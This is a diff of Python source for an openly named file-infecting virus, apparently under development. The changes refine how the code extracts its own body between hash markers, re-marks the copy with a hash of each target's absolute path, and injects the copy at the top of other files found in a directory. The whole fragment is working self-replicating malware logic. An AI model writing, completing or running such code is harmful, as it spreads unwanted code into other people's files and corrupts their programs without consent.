@@ -18,7 +18,7 @@ def get_virus():
     with open(__file__, "r") as current_file:
         current_file_lines = current_file.readlines()
 
-    virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
+    virus_hash = hashlib.md5(os.path.abspath(__file__).encode("utf-8")).hexdigest()
     start_hash = "# start-" + virus_hash
     end_hash = "# end-" + virus_hash
     is_catching = False
@@ -26,16 +26,16 @@ def get_virus():
     for line in current_file_lines:
         if (start_hash in line or "# body-start\n" in line):
             is_catching = True
-            virus_lines.append(start_hash + "\n")
-            print("start catching")
-            continue
+            # virus_lines.append(start_hash + "\n")
+            # print("start catching")
+            # continue
         if is_catching:
             virus_lines.append(line)
         if (end_hash in line or "# body-end\n" in line):
             is_catching = False
-            virus_lines.append(end_hash + "\n")
-            print("end catching")
-            break
+            # virus_lines.append(end_hash + "\n")
+            # print("end catching")
+            # break
             
     return virus_lines
 
@@ -44,7 +44,13 @@ def find_infectable_files(directory = "."):
 
 def infect(target, virus_code):
 
-    name_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
+
+    # Change name hash in virus_code to target name 
+    name_hash = hashlib.md5(os.path.abspath(target).encode("utf-8")).hexdigest()
+    new_code = virus_code
+    new_code[0] = "# start-" + name_hash + "\n"
+    new_code[-1] = "# end-" + name_hash + "\n"
+    
     # read lines of file
     target_file_lines = None
     with open(target, "r") as target_original:
@@ -57,7 +63,7 @@ def infect(target, virus_code):
     # FOR NOW THIS WILL BE START OF FILE
     injection_point = 0
     # inject code (into read list)
-    target_new_lines = target_file_lines[:injection_point] + virus_code + target_file_lines[injection_point:]
+    target_new_lines = target_file_lines[:injection_point] + new_code + target_file_lines[injection_point:]
     # target_new = virus_code + target_file_lines
     
     # create a copy of the file, write newly created version of original file w. injected code to it 
